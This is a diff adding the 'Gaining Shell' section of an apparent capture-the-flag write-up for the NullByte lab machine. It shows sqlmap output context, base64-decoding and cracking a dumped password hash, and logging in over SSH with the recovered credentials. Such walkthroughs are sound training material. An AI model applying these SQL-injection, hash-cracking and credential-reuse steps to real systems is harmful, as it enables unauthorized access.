@@ -151,8 +151,37 @@ root@kali: sqlmap -u "http://192.168.127.232/kzMb5nVYJw/420search.php?usrtosearc
 +----+---------------------------------------------+--------+------------+
 ```
 
+## 3.Gaining Shell
 
+yes, we have `ramses` hashed password here, to find the actual password, first base64 decode the string (add a trailing `=` at the end) :
 
+```text
+root@kali: echo 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE' | base64 -d
+
+c6d6bd7ebf806f43c76acc3681703b81
+```
+
+and use hashcat or john or crackstation to find the password, i used crackstation and it was `omega`
+
+now we can simply SSH to the machine with `ramses:omega`
+
+```text
+root@kali: ssh ramses@192.168.127.232 -p 777
+ramses@192.168.127.232's password:
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Sep 23 23:15:00 2023 from 192.168.127.128
+
+ramses@NullByte:~$ id
+uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
+```
+
+## 4.Privilege Escalation
 
 
 
